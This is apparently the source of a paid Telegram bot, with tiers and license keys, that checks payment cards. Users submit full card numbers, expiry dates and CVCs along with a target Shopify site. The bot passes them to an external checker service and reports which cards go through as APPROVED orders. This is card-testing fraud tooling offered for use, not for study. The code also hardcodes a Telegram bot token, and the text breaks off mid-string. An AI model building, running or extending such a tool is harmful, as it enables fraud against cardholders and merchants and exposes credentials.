import asyncio
import httpx
import json
import logging
import os
import time
import html
import secrets
import threading
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict, field
from enum import Enum
from typing import Optional, List, Dict, Any
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode, ChatAction


# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 CORE CONFIGURATION & SETUP
# ═══════════════════════════════════════════════════════════════════════════════

# Create directories FIRST, before logging setup
Path("data").mkdir(exist_ok=True)
Path("logs").mkdir(exist_ok=True)

# Premium logging setup (AFTER directory creation)
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.FileHandler("logs/premium_bot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Premium configuration
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY"
CHECKER_API_URL = "https://sigmabro766-1.onrender.com"
BINLIST_API_URL = "https://lookup.binlist.net/"

# Admin configuration (Add your Telegram user IDs here)
ADMIN_IDS = [123456789, 987654321]  # Replace with actual admin Telegram IDs

# Premium headers
COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}


# ═══════════════════════════════════════════════════════════════════════════════
# 💎 PREMIUM DATA MODELS
# ═══════════════════════════════════════════════════════════════════════════════

class MembershipLevel(Enum):
    FREE = "free"
    PREMIUM = "premium"
    VIP = "vip"
    ELITE = "elite"

@dataclass
class UserProfile:
    user_id: int
    username: str
    membership: MembershipLevel = MembershipLevel.FREE
    total_checks: int = 0
    successful_checks: int = 0
    failed_checks: int = 0
    join_date: datetime = field(default_factory=datetime.now)
    last_active: datetime = field(default_factory=datetime.now)
    premium_expires: Optional[datetime] = None
    current_site: Optional[str] = None
    daily_checks: int = 0
    last_daily_reset: datetime = field(default_factory=datetime.now)

    @property
    def success_rate(self) -> float:
        if self.total_checks == 0:
            return 0.0
        return (self.successful_checks / self.total_checks) * 100

    @property
    def membership_emoji(self) -> str:
        emojis = {
            MembershipLevel.FREE: "🆓",
            MembershipLevel.PREMIUM: "💎",
            MembershipLevel.VIP: "👑",
            MembershipLevel.ELITE: "⭐"
        }
        return emojis[self.membership]

    @property
    def processing_delay(self) -> float:
        delays = {
            MembershipLevel.FREE: 1.0,
            MembershipLevel.PREMIUM: 0.5,
            MembershipLevel.VIP: 0.2,
            MembershipLevel.ELITE: 0.1
        }
        return delays[self.membership]

@dataclass
class CheckResult:
    card_number: str
    site_url: str
    status: str
    response: str
    timestamp: datetime
    user_id: int
    processing_time: float
    bin_info: Dict[str, Any]

@dataclass
class LicenseKey:
    key: str
    tier: MembershipLevel
    duration_days: int
    created_by: int
    created_at: datetime
    used_by: Optional[int] = None
    used_at: Optional[datetime] = None
    is_used: bool = False


# ═══════════════════════════════════════════════════════════════════════════════
# 🎨 PREMIUM UI COMPONENTS
# ═══════════════════════════════════════════════════════════════════════════════

class PremiumUI:
    # Premium spinners for different tiers
    SPINNERS = {
        MembershipLevel.FREE: ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"],
        MembershipLevel.PREMIUM: ["💎", "✨", "💫", "⭐", "🌟", "✨", "💫", "⭐"],
        MembershipLevel.VIP: ["👑", "💎", "🔥", "⚡", "🚀", "💎", "🔥", "⚡"],
        MembershipLevel.ELITE: ["⭐", "🌟", "✨", "💫", "🔥", "⚡", "🚀", "💎"]
    }

    @staticmethod
    def create_header(title: str, width: int = 35) -> str:
        """Create a premium box-drawing header"""
        padding = max(0, width - len(title) - 2)
        left_pad = padding // 2
        right_pad = padding - left_pad
        
        return f"""╔{'═' * width}╗
║{' ' * left_pad}{title}{' ' * right_pad}║
╚{'═' * width}╝"""

    @staticmethod
    def create_progress_bar(progress: float, width: int = 20) -> str:
        """Create an animated progress bar"""
        filled = int(progress * width)
        bar = "█" * filled + "░" * (width - filled)
        return f"[{bar}] {progress:.1%}"

    @staticmethod
    def create_stats_box(user: UserProfile) -> str:
        """Create a premium stats display"""
        return f"""┌─── 📊 YOUR STATS ───┐
│ Success Rate: {PremiumUI.create_progress_bar(user.success_rate/100, 10)} {user.success_rate:.1f}% │
│ Total Checks: {user.total_checks:,} │
│ Member Since: {(datetime.now() - user.join_date).days} days │
│ Membership: {user.membership_emoji} {user.membership.value.upper()} │
└─────────────────────────────────┘"""

    @staticmethod
    def format_check_result(result: CheckResult, user: UserProfile) -> str:
        """Format a premium check result"""
        status_emoji = {
            "APPROVED": "🟢",
            "DECLINED": "🔴", 
            "ERROR": "🟡",
            "TIMEOUT": "⏱️"
        }.get(result.status, "🟡")

        # Mask the card number for display
        masked_card = result.card_number[:6] + "**" + result.card_number[-4:] if len(result.card_number) > 10 else result.card_number

        return f"""<b>{PremiumUI.create_header("PREMIUM CHECK RESULT")}</b>

💳 <b>Card:</b> <code>{html.escape(masked_card)}</code>
🌐 <b>Site:</b> <pre>{html.escape(result.site_url)}</pre>
{status_emoji} <b>Status:</b> {html.escape(result.status)}
🗣️ <b>Response:</b> <pre>{html.escape(result.response[:150])}</pre>

<pre>─ ─ ─ BIN INFO ─ ─ ─</pre>
<b>BIN:</b> <code>{result.bin_info.get('bin', 'N/A')}</code>
<b>Info:</b> {result.bin_info.get('scheme', 'N/A')} - {result.bin_info.get('type', 'N/A')}
<b>Bank:</b> {result.bin_info.get('bank_name', 'N/A')} 🏦
<b>Country:</b> {result.bin_info.get('country_name', 'N/A')} {result.bin_info.get('country_emoji', '🏳️')}

<pre>─ ─ ─ META ─ ─ ─</pre>
👤 <b>Checked By:</b> @{user.username} {user.membership_emoji}
⏱️ <b>Time:</b> {result.processing_time:.2f}s | Speed: {user.membership.value.upper()}"""


# ═══════════════════════════════════════════════════════════════════════════════
# 💾 PREMIUM DATA MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class DataManager:
    def __init__(self):
        self.users: Dict[int, UserProfile] = {}
        self.history: List[CheckResult] = []
        self.license_keys: Dict[str, LicenseKey] = {}
        self._lock = threading.Lock()
        self._load_all_data()

    def _load_all_data(self):
        """Load all persistent data"""
        try:
            # Load user profiles
            if os.path.exists("data/user_profiles.json"):
                with open("data/user_profiles.json", 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for user_id, user_data in data.items():
                        user_data['user_id'] = int(user_id)
                        user_data['membership'] = MembershipLevel(user_data['membership'])
                        user_data['join_date'] = datetime.fromisoformat(user_data['join_date'])
                        user_data['last_active'] = datetime.fromisoformat(user_data['last_active'])
                        user_data['last_daily_reset'] = datetime.fromisoformat(user_data['last_daily_reset'])
                        if user_data.get('premium_expires'):
                            user_data['premium_expires'] = datetime.fromisoformat(user_data['premium_expires'])
                        self.users[int(user_id)] = UserProfile(**user_data)

            # Load license keys
            if os.path.exists("data/license_keys.json"):
                with open("data/license_keys.json", 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for key, key_data in data.items():
                        key_data['tier'] = MembershipLevel(key_data['tier'])
                        key_data['created_at'] = datetime.fromisoformat(key_data['created_at'])
                        if key_data.get('used_at'):
                            key_data['used_at'] = datetime.fromisoformat(key_data['used_at'])
                        self.license_keys[key] = LicenseKey(**key_data)

            logger.info(f"Loaded {len(self.users)} users and {len(self.license_keys)} license keys")
        except Exception as e:
            logger.error(f"Error loading data: {e}")

    def _save_all_data(self):
        """Save all data atomically"""
        with self._lock:
            try:
                # Save user profiles
                user_data = {}
                for user_id, user in self.users.items():
                    data = asdict(user)
                    data['membership'] = data['membership'].value
                    data['join_date'] = data['join_date'].isoformat()
                    data['last_active'] = data['last_active'].isoformat()
                    data['last_daily_reset'] = data['last_daily_reset'].isoformat()
                    if data['premium_expires']:
                        data['premium_expires'] = data['premium_expires'].isoformat()
                    user_data[str(user_id)] = data

                with open("data/user_profiles.json.tmp", 'w', encoding='utf-8') as f:
                    json.dump(user_data, f, indent=2, ensure_ascii=False)
                os.replace("data/user_profiles.json.tmp", "data/user_profiles.json")

                # Save license keys
                key_data = {}
                for key, license_key in self.license_keys.items():
                    data = asdict(license_key)
                    data['tier'] = data['tier'].value
                    data['created_at'] = data['created_at'].isoformat()
                    if data['used_at']:
                        data['used_at'] = data['used_at'].isoformat()
                    key_data[key] = data

                with open("data/license_keys.json.tmp", 'w', encoding='utf-8') as f:
                    json.dump(key_data, f, indent=2, ensure_ascii=False)
                os.replace("data/license_keys.json.tmp", "data/license_keys.json")

                logger.info("Data saved successfully")
            except Exception as e:
                logger.error(f"Error saving data: {e}")

    def get_user(self, user_id: int, username: str = "") -> UserProfile:
        """Get or create user profile"""
        if user_id not in self.users:
            self.users[user_id] = UserProfile(user_id=user_id, username=username)
            self._save_all_data()
        else:
            # Update username if provided
            if username and self.users[user_id].username != username:
                self.users[user_id].username = username
                self._save_all_data()
        
        # Check daily reset
        user = self.users[user_id]
        if datetime.now().date() > user.last_daily_reset.date():
            user.daily_checks = 0
            user.last_daily_reset = datetime.now()
            self._save_all_data()
        
        user.last_active = datetime.now()
        return user

    def update_user(self, user: UserProfile):
        """Update user profile"""
        self.users[user.user_id] = user
        self._save_all_data()

    def add_check_result(self, result: CheckResult):
        """Add check result to history"""
        self.history.append(result)
        # Keep only last 1000 entries
        if len(self.history) > 1000:
            self.history = self.history[-1000:]

    def generate_license_key(self, tier: MembershipLevel, duration_days: int, created_by: int) -> str:
        """Generate a new license key"""
        prefix = {
            MembershipLevel.PREMIUM: "PRE",
            MembershipLevel.VIP: "VIP", 
            MembershipLevel.ELITE: "ELT"
        }.get(tier, "KEY")
        
        key = f"{prefix}-{secrets.token_hex(4).upper()}-{secrets.token_hex(4).upper()}"
        
        license_key = LicenseKey(
            key=key,
            tier=tier,
            duration_days=duration_days,
            created_by=created_by,
            created_at=datetime.now()
        )
        
        self.license_keys[key] = license_key
        self._save_all_data()
        return key

    def redeem_license_key(self, key: str, user_id: int) -> bool:
        """Redeem a license key"""
        if key not in self.license_keys or self.license_keys[key].is_used:
            return False
        
        license_key = self.license_keys[key]
        license_key.is_used = True
        license_key.used_by = user_id
        license_key.used_at = datetime.now()
        
        # Update user membership
        user = self.users[user_id]
        user.membership = license_key.tier
        user.premium_expires = datetime.now() + timedelta(days=license_key.duration_days)
        
        self._save_all_data()
        return True


# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 PREMIUM API SERVICE - FIXED VERSION
# ═══════════════════════════════════════════════════════════════════════════════

class APIService:
    def __init__(self):
        self.session = None

    async def get_session(self) -> httpx.AsyncClient:
        """Get or create HTTP session"""
        if self.session is None:
            self.session = httpx.AsyncClient(
                headers=COMMON_HTTP_HEADERS, 
                timeout=httpx.Timeout(60.0, connect=10.0),  # Increased timeout
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)
            )
        return self.session

    async def get_bin_details(self, bin_number: str) -> Dict[str, Any]:
        """Get BIN information with premium formatting"""
        if not bin_number or len(bin_number) < 6:
            return {
                "error": "Invalid BIN", "bin": bin_number, "scheme": "N/A", "type": "N/A",
                "brand": "N/A", "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🏳️"
            }

        try:
            session = await self.get_session()
            headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
            response = await session.get(f"{BINLIST_API_URL}{bin_number}", headers=headers)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "bin": bin_number,
                    "scheme": data.get("scheme", "N/A").upper(),
                    "type": data.get("type", "N/A").upper(),
                    "brand": data.get("brand", "N/A").upper(),
                    "bank_name": data.get("bank", {}).get("name", "N/A"),
                    "country_name": data.get("country", {}).get("name", "N/A"),
                    "country_emoji": data.get("country", {}).get("emoji", "🏳️")
                }
            else:
                return {
                    "error": f"BIN lookup failed ({response.status_code})", 
                    "bin": bin_number, "scheme": "N/A", "type": "N/A",
                    "brand": "N/A", "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🏳️"
                }
        except Exception as e:
            logger.exception(f"Error fetching BIN details for {bin_number}")
            return {
                "error": "Lookup failed", "bin": bin_number, "scheme": "N/A", "type": "N/A",
                "brand": "N/A", "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🏳️"
            }

    def parse_checker_response(self, response_text: str) -> Dict[str, Any]:
        """Parse checker API response with improved fallback"""
        if not response_text:
            return {"Response": "Empty response", "Gateway": "N/A", "Price": "0.00"}

        # First try to find JSON
        json_start = response_text.find('{')
        if json_start != -1:
            try:
                return json.loads(response_text[json_start:])
            except json.JSONDecodeError:
                pass

        # If no JSON found, try to parse as plain text response
        response_text = response_text.strip()
        
        # Check for common response patterns
        if "CARD_DECLINED" in response_text.upper():
            return {"Response": "CARD_DECLINED", "Gateway": "Shopify", "Price": "0.00"}
        elif "THANK YOU" in response_text.upper() or "ORDER_PLACED" in response_text.upper():
            return {"Response": "ORDER_PLACED", "Gateway": "Shopify", "Price": "0.00"}
        elif "INSUFFICIENT_FUNDS" in response_text.upper():
            return {"Response": "INSUFFICIENT_FUNDS", "Gateway": "Shopify", "Price": "0.00"}
        elif "INCORRECT_CVC" in response_text.upper():
            return {"Response": "INCORRECT_CVC", "Gateway": "Shopify", "Price": "0.00"}
        else:
            return {"Response": response_text[:200], "Gateway": "Unknown", "Price": "0.00"}

    async def check_card(self, site_url: str, card_details: str) -> Dict[str, Any]:
        """Check card with improved error handling and debugging"""
        try:
            session = await self.get_session()
            
            # Construct the exact URL as shown in your example
            url = f"{CHECKER_API_URL}/?site={site_url}&cc={card_details}"
            
            logger.info(f"Making request to: {url}")
            
            # Make the request with proper parameters
            response = await session.get(
                CHECKER_API_URL,
                params={"site": site_url, "cc": card_details}
            )
            
            logger.info(f"Response status: {response.status_code}")
            logger.info(f"Response headers: {dict(response.headers)}")
            logger.info(f"Response text (first 500 chars): {response.text[:500]}")
            
            if response.status_code == 200:
                return self.parse_checker_response(response.text)
            else:
                error_msg = f"API Error ({response.status_code})"
                if response.text:
                    error_msg += f": {response.text[:100]}"
                
                return {
                    "Response": error_msg,
                    "Gateway": "N/A",
                    "Price": "0.00"
                }
                
        except httpx.TimeoutException:
            logger.error(f"Timeout checking card: {card_details[:6]}***")
            return {
                "Response": "Request timeout - API took too long to respond",
                "Gateway": "N/A", 
                "Price": "0.00"
            }
        except httpx.ConnectError as e:
            logger.error(f"Connection error: {str(e)}")
            return {
                "Response": f"Connection failed: Cannot reach API server",
                "Gateway": "N/A", 
                "Price": "0.00"
            }
        except Exception as e:
            logger.exception(f"Unexpected error checking card: {card_details[:6]}***")
            return {
                "Response": f"System Error: {str(e)[:100]}",
                "Gateway": "N/A", 
                "Price": "0.00"
            }

    async def close_session(self):
        """Close the HTTP session"""
        if self.session:
            await self.session.aclose()
            self.session = None


# ═══════════════════════════════════════════════════════════════════════════════
# 👑 PREMIUM BOT CLASS - UPDATED
# ═══════════════════════════════════════════════════════════════════════════════

class PremiumBot:
    def __init__(self):
        self.data_manager = DataManager()
        self.api_service = APIService()
        self.ui = PremiumUI()

    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        return user_id in ADMIN_IDS

    async def send_premium_spinner(self, context: ContextTypes.DEFAULT_TYPE, chat_id: int, 
                                 membership: MembershipLevel, text: str = "Processing") -> Any:
        """Send animated spinner based on membership level"""
        spinner_chars = self.ui.SPINNERS[membership]
        message = await context.bot.send_message(
            chat_id, 
            f"{text} {spinner_chars[0]}", 
            parse_mode=ParseMode.HTML
        )
        return message

    async def animate_spinner(self, context: ContextTypes.DEFAULT_TYPE, message: Any, 
                            membership: MembershipLevel, text: str, duration: float = 2.0):
        """Animate spinner for duration"""
        spinner_chars = self.ui.SPINNERS[membership]
        steps = int(duration / 0.3)
        
        for i in range(steps):
            try:
                char = spinner_chars[i % len(spinner_chars)]
                await context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=message.message_id,
                    text=f"{text} {char}",
                    parse_mode=ParseMode.HTML
                )
                await asyncio.sleep(0.3)
            except Exception:
                break

    async def delete_message_safe(self, context: ContextTypes.DEFAULT_TYPE, message: Any):
        """Safely delete a message"""
        try:
            await context.bot.delete_message(message.chat_id, message.message_id)
        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════════════════
    # 📋 COMMAND HANDLERS
    # ═══════════════════════════════════════════════════════════════════════════════

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Premium start command with beautiful UI"""
        user = update.effective_user
        profile = self.data_manager.get_user(user.id, user.username or user.first_name)
        
        welcome_text = f"""<pre>{self.ui.create_header("PREMIUM CHECKER v2.0")}</pre>

Welcome back, <b>{html.escape(profile.username)}</b> {profile.membership_emoji}

{self.ui.create_stats_box(profile)}

<pre>🚀 System Status: Online</pre>
<pre>⚡ Your Speed: {profile.membership.value.upper()} ({profile.processing_delay}s delay)</pre>"""

        keyboard = [
            [
                InlineKeyboardButton("🔗 Set Site", callback_data="site:set"),
                InlineKeyboardButton("📊 My Stats", callback_data="stats:show")
            ],
            [
                InlineKeyboardButton("💳 Single Check", callback_data="check:single"),
                InlineKeyboardButton("🗂️ Mass Check", callback_data="check:mass")
            ],
            [
                InlineKeyboardButton("🎫 Redeem Key", callback_data="key:redeem"),
                InlineKeyboardButton("📖 Commands", callback_data="help:commands")
            ]
        ]

        # Add admin button for admins
        if self.is_admin(user.id):
            keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin:panel")])

        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            try:
                await update.callback_query.message.edit_text(
                    welcome_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
                )
            except Exception:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=welcome_text,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
        else:
            await update.message.reply_text(
                welcome_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
            )

    async def check_single_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Premium single card check with improved API handling"""
        user = update.effective_user
        profile = self.data_manager.get_user(user.id, user.username or user.first_name)

        if not profile.current_site:
            await update.message.reply_text(
                "⚠️ <b>No site configured!</b>\nPlease set a site first using /setsite",
                parse_mode=ParseMode.HTML
            )
            return

        if not context.args:
            await update.message.reply_text(
                "💳 <b>Card format:</b> <code>1234567890123456|12|25|123</code>",
                parse_mode=ParseMode.HTML
            )
            return

        card_details = context.args[0]
        if card_details.count('|') != 3:
            await update.message.reply_text(
                "⚠️ <b>Invalid format!</b> Use: <code>N|M|Y|C</code>",
                parse_mode=ParseMode.HTML
            )
            return

        # Show premium loading animation
        spinner_msg = await self.send_premium_spinner(
            context, update.effective_chat.id, profile.membership, 
            f"🔍 Checking <code>{html.escape(card_details[:6])}***</code>"
        )

        start_time = time.time()
        
        # Animate spinner while processing
        animation_task = asyncio.create_task(
            self.animate_spinner(
                context, spinner_msg, profile.membership,
                f"🔍 Processing <code>{html.escape(card_details[:6])}***</code>",
                profile.processing_delay + 2.0
            )
        )

        # Add membership-based delay
        await asyncio.sleep(profile.processing_delay)

        # Get BIN info and check card
        try:
            bin_info = await self.api_service.get_bin_details(card_details.split('|')[0][:6])
            api_result = await self.api_service.check_card(profile.current_site, card_details)
        except Exception as e:
            logger.exception(f"Error during check for user {user.id}")
            api_result = {
                "Response": f"System Error: {str(e)[:50]}",
                "Gateway": "N/A",
                "Price": "0.00"
            }
            bin_info = {"error": "System Error", "bin": card_details[:6]}

        # Cancel animation
        animation_task.cancel()
        await self.delete_message_safe(context, spinner_msg)

        processing_time = time.time() - start_time

        # Determine status based on response
        response_text = api_result.get("Response", "Unknown")
        if "CARD_DECLINED" in response_text.upper():
            status = "DECLINED"
            profile.failed_checks += 1
        elif any(keyword in response_text.upper() for keyword in ["THANK YOU", "ORDER_PLACED", "SUCCESS"]):
            status = "APPROVED"
            profile.successful_checks += 1
        elif any(keyword in response_text.upper() for keyword in ["INSUFFICIENT_FUNDS", "INCORRECT_CVC"]):
            status = "DECLINED"
            profile.failed_checks += 1
        else:
            status = "ERROR"

        # Update user stats
        profile.total_checks += 1
        profile.daily_checks += 1
        self.data_manager.update_user(profile)

        # Create result
        result = CheckResult(
            card_number=card_details,
            site_url=profile.current_site,
            status=status,
            response=response_text,
            timestamp=datetime.now(),
            user_id=user.id,
            processing_time=processing_time,
            bin_info=bin_info
        )

        self.data_manager.add_check_result(result)

        # Send premium result
        result_text = self.ui.format_check_result(result, profile)
        
        keyboard = [
            [InlineKeyboardButton("💳 Check Another", callback_data="check:single")],
            [
                InlineKeyboardButton("📊 My Stats", callback_data="stats:show"),
                InlineKeyboardButton("🏠 Main Menu", callback_data="nav:start")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            result_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )

    async def setsite_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Set target site"""
        user = update.effective_user
        profile = self.data_manager.get_user(user.id, user.username or user.first_name)

        if not context.args:
            await update.message.reply_text(
                "🔗 <b>Set Target Site:</b>\n/setsite <code>https://your-shopify-site.com</code>",
                parse_mode=ParseMode.HTML
            )
            return

        site_url = context.args[0]
        if not (site_url.startswith("http://") or site_url.startswith("https://")):
            await update.message.reply_text(
                "⚠️ <b>Invalid URL!</b> Must start with http:// or https://",
                parse_mode=ParseMode.HTML
            )
            return

        profile.current_site = site_url
        self.data_manager.update_user(profile)

        response_text = f"""<pre>{self.ui.create_header("SITE CONFIGURED")}</pre>

✅ <b>Target site updated successfully!</b>

<pre>🔗 Target: {html.escape(site_url)}</pre>
<pre>🚀 Speed: {profile.membership.value.upper()} Tier</pre>
<pre>📊 Ready for checks!</pre>"""

        keyboard = [
            [
                InlineKeyboardButton("💳 Single Check", callback_data="check:single"),
                InlineKeyboardButton("🗂️ Mass Check", callback_data="check:mass")
            ],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="nav:start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            response_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
        )

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show user statistics"""
        user = update.effective_user
        profile = self.data_manager.get_user(user.id, user.username or user.first_name)

        days_member = (datetime.now() - profile.join_date).days
        
        stats_text = f"""<pre>{self.ui.create_header("YOUR PREMIUM STATS")}</pre>

{self.ui.create_stats_box(profile)}

<pre>📈 Detailed Analytics:</pre>
<pre>├ Total Checks: {profile.total_checks:,}</pre>
<pre>├ Successful: {profile.successful_checks:,}</pre>
<pre>├ Failed: {profile.failed_checks:,}</pre>
<pre>├ Today: {profile.daily_checks:,}</pre>
<pre>└ Speed Tier: {profile.membership.value.upper()}</pre>

<pre>🎯 Current Site: {html.escape(profile.current_site or "Not Set")}</pre>"""

        keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh", callback_data="stats:show"),
                InlineKeyboardButton("📈 Upgrade", callback_data="upgrade:info")
            ],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="nav:start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.message.edit_text(
                stats_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                stats_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
            )

    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Redeem license key"""
        user = update.effective_user
        profile = self.data_manager.get_user(user.id, user.username or user.first_name)

        if not context.args:
            await update.message.reply_text(
                "🎫 <b>Redeem License Key:</b>\n/redeem <code>PRE-XXXX-YYYY</code>",
                parse_mode=ParseMode.HTML
            )
            return

        key = context.args[0].upper()
        
        if self.data_manager.redeem_license_key(key, user.id):
            profile = self.data_manager.get_user(user.id)  # Refresh profile
            
            success_text = f"""<pre>{self.ui.create_header("KEY REDEEMED!")}</pre>

🎉 <b>License key activated successfully!</b>

<pre>🎫 Key: {html.escape(key)}</pre>
<pre>👑 New Tier: {profile.membership_emoji} {profile.membership.value.upper()}</pre>
<pre>⚡ Speed: {profile.processing_delay}s delay</pre>
<pre>📅 Expires: {profile.premium_expires.strftime('%Y-%m-%d') if profile.premium_expires else 'Never'}</pre>

Welcome to the premium experience! 🚀"""

            keyboard = [
                [
                    InlineKeyboardButton("💳 Start Checking", callback_data="check:single"),
                    InlineKeyboardButton("📊 My Stats", callback_data="stats:show")
                ],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="nav:start")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                success_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                "❌ <b>Invalid or used key!</b>\nPlease check your key and try again.",
                parse_mode=ParseMode.HTML
            )

    # ═══════════════════════════════════════════════════════════════════════════════
    # 👑 ADMIN COMMANDS
    # ═══════════════════════════════════════════════════════════════════════════════

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Admin panel - only for authorized users"""
        user = update.effective_user
        
        if not self.is_admin(user.id):
            await update.message.reply_text("❌ Access denied.")
            return

        total_users = len(self.data_manager.users)
        total_checks = sum(u.total_checks for u in self.data_manager.users.values())
        active_keys = len([k for k in self.data_manager.license_keys.values() if not k.is_used])

        admin_text = f"""<pre>{self.ui.create_header("ADMIN CONTROL PANEL")}</pre>

<pre>📊 System Statistics:</pre>
<pre>├ Total Users: {total_users:,}</pre>
<pre>├ Total Checks: {total_checks:,}</pre>
<pre>├ Active Keys: {active_keys}</pre>
<pre>└ Uptime: System Online</pre>

<pre>⚡ Admin Commands:</pre>
<pre>/genkey &lt;tier&gt; &lt;days&gt; - Generate key</pre>
<pre>/users - View all users</pre>
<pre>/broadcast &lt;msg&gt; - Send to all</pre>"""

        keyboard = [
            [
                InlineKeyboardButton("🎫 Generate Key", callback_data="admin:genkey"),
                InlineKeyboardButton("👥 View Users", callback_data="admin:users")
            ],
            [
                InlineKeyboardButton("📊 Analytics", callback_data="admin:analytics"),
                InlineKeyboardButton("📢 Broadcast", callback_data="admin:broadcast")
            ],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="nav:start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.message.edit_text(
                admin_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                admin_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML
            )

    async def genkey_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate license key - admin only"""
        user = update.effective_user
        
        if not self.is_admin(user.id):
            await update.message.reply_text("❌ Access denied.")
            return

        if len(context.args) < 2:
            await update.message.reply_text(
                "🎫 <b>Generate Key:</b>\n/genkey <code>&lt;premium|vip|elite&gt; &lt;days&gt;</code>",
                parse_mode=ParseMode.HTML
            )
            return

        tier_name = context.args[0].lower()
        try:
            days = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid number of days!")
            return

        tier_map = {
            "premium": MembershipLevel.PREMIUM,
            "vip": MembershipLevel.VIP,
            "elite": MembershipLevel.ELITE
        }

        if tier_name not in tier_map:
            await update.message.reply_text("❌ Invalid tier! Use: premium, vip, or elite")
            return

        tier = tier_map[tier_name]
        key = self.data_manager.generate_license_key(tier, days, user.id)

        key_text = f"""<pre>{self.ui.create_header("LICENSE KEY GENERATED")}</pre>

🎫 <b>New License Key Created!</b>

<pre>🔑 Key: {key}</pre>
<pre>👑 Tier: {tier.value.upper()}</pre>
<pre>📅 Duration: {days} days</pre>
<pre>👤 Created by: @{user.username}</pre>
<pre>🕐 Created: {datetime.now().strftime('%Y-%m-%d %H:%M')}</pre>

Ready for redemption! 🚀"""

        await update.message.reply_text(key_text, parse_mode=ParseMode.HTML)

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎛️ CALLBACK HANDLERS
    # ═══════════════════════════════════════════════════════════════════════════════

    async def callback_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all callback queries"""
        query = update.callback_query
        data = query.data
        await query.answer()

        # Navigation
        if data == "nav:start":
            await self.start_command(update, context)
        
        # Stats
        elif data == "stats:show":
            await self.stats_command(update, context)
        
        # Admin
        elif data == "admin:panel":
            await self.admin_panel(update, context)
        
        # Site management
        elif data == "site:set":
            await query.message.reply_text(
                "🔗 <b>Set Target Site:</b>\n/setsite <code>https://your-shopify-site.com</code>",
                parse_mode=ParseMode.HTML
            )
        
        # Checking
        elif data == "check:single":
            await query.message.reply_text(
                "💳 <b>Single Check:</b>\n/check <code>1234567890123456|12|25|123</code>",
                parse_mode=ParseMode.HTML
            )
        
        elif data == "check:mass":
            await query.message.reply_text(
                "🗂️ <b>Mass Check:</b>\nUpload a .txt file and use /masscheck",
                parse_mode=ParseMode.HTML
            )
        
        # Key redemption
        elif data == "key:redeem":
            await query.message.reply_text(
                "🎫 <b>Redeem License Key:</b>\n/redeem <code>PRE-XXXX-YYYY</code>",
                parse_mode=ParseMode.HTML
            )
        
        # Help
        elif data == "help:commands":
            await query.message.reply_text(
                f"""<pre>{self.ui.create_header("COMMAND REFERENCE")}</pre>

<pre>🎯 Core Commands:</pre>
<pre>/start - Main menu</pre>
<pre>/setsite &lt;url&gt; - Set target</pre>
